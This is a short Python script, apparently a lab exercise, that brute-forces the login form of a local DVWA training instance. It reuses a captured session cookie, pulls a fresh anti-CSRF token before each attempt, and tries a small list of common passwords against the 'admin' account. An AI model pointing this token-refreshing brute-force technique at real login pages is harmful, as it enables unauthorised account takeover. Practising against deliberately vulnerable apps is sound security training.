import requests
from bs4 import BeautifulSoup

URL = "http://localhost:8080" # DVWA running on docker
LOGIN_PAGE = f"{URL}/vulnerabilities/brute/"
USERNAME = "admin"

# Burp Suite extracted valid cookie session
COOKIES = {
    "PHPSESSID": "ev333ds3tg8sf25lragbk66n62",
    "security": "high"
}

# Simple list with common passwords
passwords = [
	"123",
	"admin",
	"123456",
	"qwerty",
	"abc123",
	"123456789",
	"pass",
	"password",
	"admin"
]

session = requests.Session()
session.cookies.update(COOKIES)

# Attempt analysis showed that CSRF token is refresh at each request
# Each new attempt should get a new token
def get_token():
    r = session.get(LOGIN_PAGE)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]
    return token


def try_login(password):
    token = get_token()

    params = {
        "username": USERNAME,
        "password": password,
        "Login": "Login",
        "user_token": token
    }

    r = session.get(LOGIN_PAGE, params=params)

    # Tries to check if the system returns username or password is incorrect
    if "Username and/or password incorrect" not in r.text:
        print(f"[+] POSSIBLE CANDIDATE: {password}")
        return True

    print(f"[-] {password}")
    return False

for pwd in passwords:
    if try_login(pwd):
        break
